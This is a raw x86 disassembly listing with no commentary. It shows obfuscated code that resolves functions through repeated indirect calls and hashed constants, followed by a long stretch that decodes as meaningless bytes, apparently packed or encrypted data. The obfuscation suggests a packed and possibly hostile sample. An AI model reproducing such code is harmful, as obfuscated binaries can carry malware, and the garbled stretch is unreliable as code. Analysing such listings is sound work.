  4211f8:	push   0x4287ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x428ebf,0x428ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x428e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x428e63
  421221:	mov    al,ds:0x4287b8
  421226:	cmp    al,BYTE PTR ds:0x4287c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4287d5
  421237:	mov    DWORD PTR ds:0x428e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4287e6
  421247:	mov    DWORD PTR ds:0x428e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x428e83,0x99a
  421261:	push   0x4287ef
  421266:	adc    DWORD PTR ds:0x428e9f,0x22ee
  421270:	push   0x4287fb
  421275:	adc    DWORD PTR ds:0x428ecb,0x428ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x428e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x428e57,0x70e
  42129d:	mov    al,ds:0x428808
  4212a2:	cmp    al,BYTE PTR ds:0x428819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x428825
  4212b3:	mov    DWORD PTR ds:0x428ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x428836
  4212c3:	mov    DWORD PTR ds:0x428ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x428e23,0x428e6f
  4212dd:	push   0x42883f
  4212e2:	xor    DWORD PTR ds:0x428e2b,0x428e87
  4212ec:	push   0x42884b
  4212f1:	or     DWORD PTR ds:0x428e8f,0x428e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x428ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x428e2f,0x1c83
  421319:	mov    al,ds:0x428858
  42131e:	cmp    al,BYTE PTR ds:0x428869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x428875
  42132f:	mov    DWORD PTR ds:0x428eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x428886
  42133f:	mov    DWORD PTR ds:0x428e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x42888f
  421354:	or     DWORD PTR ds:0x428e6f,0x428e43
  42135e:	push   0x42889b
  421363:	adc    DWORD PTR ds:0x428e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x428e93,0x428eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4288a8
  421386:	cmp    al,BYTE PTR ds:0x4288b9
  42138c:	mov    DWORD PTR ds:0x428e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x428ea3,0x4898
  4213a6:	mov    al,ds:0x4288c5
  4213ab:	cmp    al,BYTE PTR ds:0x4288d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4288df
  4213bc:	push   0x4288eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x428ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4288f8
  4213da:	cmp    al,BYTE PTR ds:0x428909
  4213e0:	mov    DWORD PTR ds:0x428e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x428e5b,0x25d1
  4213fa:	mov    al,ds:0x428915
  4213ff:	cmp    al,BYTE PTR ds:0x428926
  421405:	mov    DWORD PTR ds:0x428e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x42892f
  42141a:	adc    DWORD PTR ds:0x428ec7,0x4db7
  421424:	push   0x42893b
  421429:	sbb    DWORD PTR ds:0x428e6b,0x428ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x428e33,0x428e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x428ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x428948
  421456:	cmp    al,BYTE PTR ds:0x428959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x428965
  421467:	cmp    al,BYTE PTR ds:0x428976
  42146d:	jne    0x420849
  421473:	push   0x42897f
  421478:	push   0x42898b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x428998
  42148c:	cmp    al,BYTE PTR ds:0x4289a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4289b5
  42149d:	cmp    al,BYTE PTR ds:0x4289c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4289cf
  4214ae:	push   0x4289db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4289e8
  4214c2:	cmp    al,BYTE PTR ds:0x4289f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x428a05
  4214d3:	cmp    al,BYTE PTR ds:0x428a16
  4214d9:	jne    0x420849
  4214df:	push   0x428a1f
  4214e4:	push   0x428a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x428a38
  4214f8:	cmp    al,BYTE PTR ds:0x428a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x428a55
  421509:	cmp    al,BYTE PTR ds:0x428a66
  42150f:	jne    0x420849
  421515:	push   0x428a6f
  42151a:	push   0x428a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x428a88
  42152e:	cmp    al,BYTE PTR ds:0x428a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x428aa5
  42153f:	cmp    al,BYTE PTR ds:0x428ab6
  421545:	jne    0x420849
  42154b:	push   0x428abf
  421550:	push   0x428acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x428ad8
  421564:	cmp    al,BYTE PTR ds:0x428ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x428af5
  421575:	cmp    al,BYTE PTR ds:0x428b06
  42157b:	jne    0x420849
  421581:	push   0x428b0f
  421586:	push   0x428b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x428b28
  42159a:	cmp    al,BYTE PTR ds:0x428b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x428b45
  4215ab:	cmp    al,BYTE PTR ds:0x428b56
  4215b1:	jne    0x420849
  4215b7:	push   0x428b5f
  4215bc:	push   0x428b6b
  4215c1:	call   edi
  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x428b78
  4215d0:	cmp    al,BYTE PTR ds:0x428b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x428b95
  4215e1:	cmp    al,BYTE PTR ds:0x428ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x428baf
  4215f2:	push   0x428bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x428bc8
  421606:	cmp    al,BYTE PTR ds:0x428bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x428be5
  421617:	cmp    al,BYTE PTR ds:0x428bf6
  42161d:	jne    0x420849
  421623:	push   0x428bff
  421628:	push   0x428c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
  42163b:	cmp    eax,0xf89c85a4
  421640:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esp+0x20]
  42164a:	mov    ecx,DWORD PTR [esp+0x38]
  42164e:	xor    eax,esi
  421650:	add    eax,ebx
  421652:	cmp    eax,ecx
  421654:	je     0x42169f
  42165a:	mov    eax,ds:0x428373
  42165f:	mov    eax,DWORD PTR [eax+0x194]
  421665:	mov    ecx,DWORD PTR [eax]
  421667:	mov    eax,DWORD PTR [ecx+0x3c]
  42166a:	push   DWORD PTR ds:0x428453
  421670:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  421674:	push   DWORD PTR ds:0x4281f7
  42167a:	add    eax,ecx
  42167c:	mov    ecx,DWORD PTR ds:0x428373
  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x428373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x428373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4283ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4283f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x428373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4283f7
  421818:	mov    edx,DWORD PTR ds:0x4283ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4283f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4283f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4283f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4283f7
  42186b:	mov    ds:0x4283ff,eax
  421870:	mov    eax,ds:0x428373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x428ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x428ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x428ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x428e77
  4218d2:	call   DWORD PTR ds:0x42a9e7
  4218d8:	cmp    DWORD PTR ds:0x428ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x428ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x428ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x428ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x428ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x428e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x428e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x428e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x428e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x428e43,0x428ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x428ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x428e33
  421969:	or     DWORD PTR ds:0x428e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x428e2b,0x428e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x428e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x428e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x428e23,0x428e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x428e37
  4219b8:	add    eax,DWORD PTR ds:0x428ebf
  4219be:	mov    ds:0x428e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x428e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x428e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x428e4b,0x428e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x428e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x428e9f,0x428e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x428e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x428ea7
  421ab6:	sub    DWORD PTR ds:0x428e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx-0x6a42adb6],al
  421ace:	jl     0x421ab4
  421ad0:	mov    ah,0x6f
  421ad2:	mov    dh,0x82
  421ad4:	sbb    DWORD PTR [edx+0x60],0xffffff83
  421ad8:	xor    DWORD PTR [ebp-0x40],0x4a
  421adc:	pop    edi
  421add:	adc    eax,ebp
  421adf:	pop    ecx
  421ae0:	jns    0x421b40
  421ae2:	add    BYTE PTR [eax-0x1e],bl
  421ae5:	pop    esp
  421ae6:	(bad)  
  421ae7:	xchg   esi,eax
  421ae8:	cdq    
  421ae9:	cmp    al,0x85
  421aeb:	pop    es
  421aec:	mov    eax,ds:0xe8d00164
  421af1:	adc    ebx,eax
  421af3:	aas    
  421af4:	lock ss mov esp,0x28c53924
  421afb:	ins    DWORD PTR es:[edi],dx
  421afc:	mov    ds:0x4359ad35,al
  421b01:	push   ebp
  421b02:	scas   eax,DWORD PTR es:[edi]
  421b03:	and    eax,DWORD PTR [eax-0x2a]
  421b06:	sbb    DWORD PTR [eax],ebp
  421b08:	pop    ecx
  421b09:	test   al,0x66
  421b0b:	and    cl,0x38
  421b0e:	test   al,0xa4
  421b10:	mov    ah,dl
  421b12:	jns    0x421b41
  421b14:	xlat   BYTE PTR ds:[ebx]
  421b15:	addr16 mov ds:0x70bb,eax
  421b19:	add    eax,0xa24095c6
  421b1e:	jp     0x421aa7
  421b20:	push   edx
  421b21:	ss into 
  421b23:	and    al,0x8e
  421b25:	inc    edi
  421b26:	retf   
  421b27:	and    BYTE PTR [eax+0x5f018e53],al
  421b2d:	mov    ds:0x3c4f1b40,eax
  421b32:	jns    0x421b64
  421b34:	cmp    esp,DWORD PTR [esi+edx*2]
  421b37:	call   0x511a0f07
  421b3c:	ror    al,1
  421b3e:	cld    
  421b3f:	cs xchg ebp,eax
  421b41:	cmc    
  421b42:	enter  0xba27,0xb3
  421b46:	stos   DWORD PTR es:[edi],eax
  421b47:	xor    ebp,DWORD PTR [eax+0x2fee367b]
  421b4d:	inc    ebp
  421b4e:	out    dx,eax
  421b4f:	mov    edx,0x29c4a5
  421b54:	scas   eax,DWORD PTR es:[edi]
  421b55:	xchg   ebx,eax
  421b56:	shr    DWORD PTR fs:[edi],0xb
  421b5a:	(bad)  
  421b5b:	cld    
  421b5c:	ds xor eax,esp
  421b5f:	mov    WORD PTR [edi],ss
  421b61:	and    BYTE PTR [eax+0x5d2ddd58],bl
  421b67:	into   
  421b68:	ror    BYTE PTR [esi+0x1653c6bf],1
  421b6e:	(bad)  
  421b6f:	mov    BYTE PTR [esi],ch
  421b71:	inc    ebx
  421b72:	lahf   
  421b73:	and    edx,DWORD PTR [edx+0x282c05f4]
  421b79:	and    al,0x2
  421b7b:	daa    
  421b7c:	in     eax,dx
  421b7d:	clc    
  421b7e:	popf   
  421b7f:	popa   
  421b80:	xor    DWORD PTR [edx+eax*8+0x4b76670d],edx
  421b87:	mov    ds:0xa525a10b,al
  421b8c:	ins    BYTE PTR es:[edi],dx
  421b8d:	cmp    DWORD PTR es:[edx-0x7a],ebx
  421b91:	mov    ds:0xc81153d2,eax
  421b96:	mov    ch,0xb7
  421b98:	pop    edi
  421b99:	jbe    0x421b24
  421b9b:	mov    ch,0x7c
  421b9d:	dec    edx
  421b9e:	out    dx,eax
  421b9f:	dec    eax
  421ba0:	ins    DWORD PTR es:[edi],dx
  421ba1:	not    ebx
  421ba3:	inc    edx
  421ba4:	sbb    eax,0xebd0d284
  421ba9:	inc    eax
  421baa:	xor    al,BYTE PTR [edx+0x29]
  421bad:	xor    ch,dl
  421baf:	mov    ah,0xfb
  421bb1:	inc    esp
  421bb2:	and    BYTE PTR fs:[ebx],dl
  421bb5:	dec    edi
  421bb6:	fs aas 
  421bb8:	stos   BYTE PTR es:[di],al
  421bba:	inc    ebp
  421bbb:	jno    0x421b66
  421bbd:	sbb    eax,0xf6a753fe
  421bc2:	mov    ah,0x59
  421bc4:	pop    edx
  421bc5:	pop    edx
  421bc6:	push   DWORD PTR [ebx]
  421bc8:	xchg   esp,eax
  421bc9:	push   esi
  421bca:	cs inc ebp
  421bcc:	mov    ds:0xef55f605,eax
  421bd1:	xor    BYTE PTR [ebx-0x8],al
  421bd4:	rol    dh,1
  421bd6:	or     al,0xed
  421bd8:	and    DWORD PTR [eax-0x1e1c9222],0xa48ce773
  421be2:	repz enter 0xba0e,0x3d
  421be7:	jnp    0x421bea
  421be9:	or     ah,BYTE PTR [edi-0x74]
  421bec:	scas   eax,DWORD PTR es:[edi]
  421bed:	push   0xffffff89
  421bef:	jne    0x421c15
  421bf1:	xor    bh,dl
  421bf3:	fsub   DWORD PTR fs:[edi-0x24]
  421bf7:	sbb    eax,0x5bf86840
  421bfc:	sub    BYTE PTR [ecx+0x6c],dh
  421bff:	retf   
  421c00:	or     DWORD PTR [ecx-0x784b62d9],esp
  421c06:	sar    bl,1
  421c08:	lds    ebp,FWORD PTR [ebx+0x35b6478d]
  421c0e:	and    BYTE PTR [ebp+0x39],ch
  421c11:	cld    
  421c12:	addr16 pop edi
  421c14:	scas   al,BYTE PTR es:[edi]
  421c15:	cli    
  421c16:	cmp    edx,DWORD PTR [edi-0x7b10a5bc]
  421c1c:	gs cwde 
  421c1e:	fucomp st(7)
  421c20:	xor    DWORD PTR [eax+0x3d],ebp
  421c23:	mov    bh,0xa4
  421c25:	gs aam 0x47
  421c28:	adc    al,0x7b
  421c2a:	stos   BYTE PTR es:[edi],al
  421c2b:	push   esp
  421c2c:	mov    bl,0x44
  421c2e:	pop    ss
  421c2f:	xor    BYTE PTR [esi],ch
  421c31:	pop    ds
  421c32:	cmp    eax,0x1775b94d
  421c37:	jg     0x421caf
  421c39:	addr16 dec ebp
  421c3b:	xchg   ebx,eax
  421c3c:	cs iret 
  421c3e:	iret   
  421c3f:	std    
  421c40:	jno    0x421c7e
  421c42:	inc    ebp
  421c43:	xor    al,0xab
  421c45:	sub    DWORD PTR [esi+0xf3fbf40],esp
  421c4b:	scas   eax,DWORD PTR es:[edi]
  421c4c:	sub    dl,BYTE PTR [ebx-0x63]
  421c4f:	lea    eax,[eax]
  421c51:	dec    edx
  421c52:	je     0x421bd9
  421c54:	ret    
  421c55:	sbb    eax,0x3345935c
  421c5a:	mov    ch,0x5a
  421c5c:	ret    
  421c5d:	cmp    eax,0xfe9d4a83
  421c62:	push   ss
  421c63:	xor    BYTE PTR [ebp-0x682a0295],bl
  421c69:	and    BYTE PTR [esi-0x5],0xa0
  421c6d:	dec    edi
  421c6e:	push   ds
  421c6f:	out    dx,eax
  421c70:	pop    ss
  421c71:	add    al,0x15
  421c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c74:	sahf   
  421c75:	call   0xd10c55ee
  421c7a:	xchg   ebx,eax
  421c7b:	stc    
  421c7c:	xchg   ebp,eax
  421c7d:	ja     0x421c51
  421c7f:	adc    eax,0x41de2b60
  421c84:	add    eax,0xe2e46fc2
  421c89:	out    0x20,eax
  421c8b:	mov    ch,0xd0
  421c8d:	add    BYTE PTR [eax-0x3f],dh
  421c90:	(bad)  
  421c91:	sub    al,0x6d
  421c93:	shl    ebx,0x3b
  421c96:	push   ss
  421c97:	aas    
  421c98:	adc    BYTE PTR [edx-0x7214f479],bh
  421c9e:	mov    eax,ds:0xf9eb941c
  421ca3:	je     0x421c75
  421ca5:	repnz adc BYTE PTR [edi],0xa7
  421ca9:	xor    esp,DWORD PTR ds:0x9ccf4a6a
  421caf:	cli    
  421cb0:	out    dx,eax
  421cb1:	fld    QWORD PTR [ebx+0x5d7b11e7]
  421cb7:	xchg   esi,eax
  421cb8:	(bad)
  421cbb:	int3   
  421cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cbd:	sbb    eax,0x6c1d391c
  421cc2:	and    BYTE PTR [eax],bh
  421cc4:	sti    
  421cc5:	mov    ds:0xe2267fdd,eax
  421cca:	daa    
  421ccb:	inc    edx
  421ccc:	pusha  
  421ccd:	xchg   ecx,eax
  421cce:	pop    ebp
  421ccf:	sti    
  421cd0:	shl    DWORD PTR [edi-0x3b05c901],0x23
  421cd7:	mov    edi,0x512b7b3
  421cdc:	inc    ecx
  421cdd:	xor    dl,BYTE PTR [esi]
  421cdf:	xchg   esi,eax
  421ce0:	mov    dh,bh
  421ce2:	inc    edx
  421ce3:	sbb    bl,BYTE PTR [esp+eiz*8+0x11a3d4eb]
  421cea:	lods   eax,DWORD PTR ds:[esi]
  421ceb:	sub    ecx,ecx
  421ced:	jg     0x421d6b
  421cef:	icebp  
  421cf0:	pop    eax
  421cf1:	mov    ch,0x83
  421cf3:	mov    esp,0xd7445bd5
  421cf8:	cs xchg esi,eax
  421cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cfb:	add    ah,ah
  421cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cfe:	test   al,0xe4
  421d00:	xchg   esi,eax
  421d01:	addr16 inc edi
  421d03:	push   0x9c82a014
  421d08:	jbe    0x421d1b
  421d0a:	mov    esi,0xacc8f505
  421d0f:	jns    0x421d76
  421d11:	jns    0x421d00
  421d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d14:	(bad)  
  421d15:	sar    bl,1
  421d17:	pushf  
  421d18:	pop    ds
  421d19:	add    BYTE PTR [ecx-0x60],ah
  421d1c:	xor    ebp,ecx
  421d1e:	sbb    eax,0x5ef1602e
  421d23:	mov    edi,?
  421d25:	jge    0x421d27
  421d27:	push   cs
  421d28:	inc    ebx
  421d29:	dec    edi
  421d2a:	jmp    0x34c3:0x5c6ebba6
  421d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d32:	lock pop edx
  421d34:	out    dx,eax
  421d35:	sub    ecx,0x84f0db60
  421d3b:	in     al,dx
  421d3c:	push   eax
  421d3d:	popa   
  421d3e:	ss cmc 
  421d40:	fidiv  DWORD PTR [ecx+0x8747125]
  421d46:	rcr    BYTE PTR [eax+0xac84deb],cl
  421d4c:	xlat   BYTE PTR ds:[ebx]
  421d4d:	sbb    edi,DWORD PTR [ecx+0xc288743]
  421d53:	inc    ecx
